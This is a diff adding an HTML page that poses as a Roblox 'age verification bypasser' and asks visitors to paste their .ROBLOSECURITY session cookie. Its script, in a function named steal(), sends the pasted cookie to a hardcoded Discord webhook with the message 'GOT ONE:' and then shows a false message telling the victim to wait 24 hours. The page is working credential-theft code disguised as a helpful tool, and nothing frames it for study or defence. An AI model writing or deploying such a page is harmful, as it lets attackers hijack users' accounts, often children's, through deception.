@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Security Service</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { border: 1px solid #0f0; padding: 30px; width: 350px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #111; color: #0f0; border: 1px solid #333; }
+        button { width: 100%; padding: 10px; background: #0f0; border: none; cursor: pointer; color: #000; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>AGE VERIFICATION BYPASSER</h3>
+        <input type="text" id="cookie" placeholder=".ROBLOSECURITY">
+        <button onclick="steal()">ACTIVATE BYPASS</button>
+    </div>
+
+    <script>
+        async function steal() {
+            const cookie = document.getElementById('cookie').value;
+            const webhook = "https://discord.com/api/webhooks/1503825230936932395/9ARHKMyInpNYZbS1poBuPb5_ZksIvCsRIQvJdCa7uJ4dQp77jfXISyFVu5EiuVtSo9eI"; // Paste your webhook here
+            
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `**GOT ONE:**\n${cookie}` })
+            });
+            alert("Verification initiated. Please wait 24 hours.");
+        }
+    </script>
+</body>
+</html>
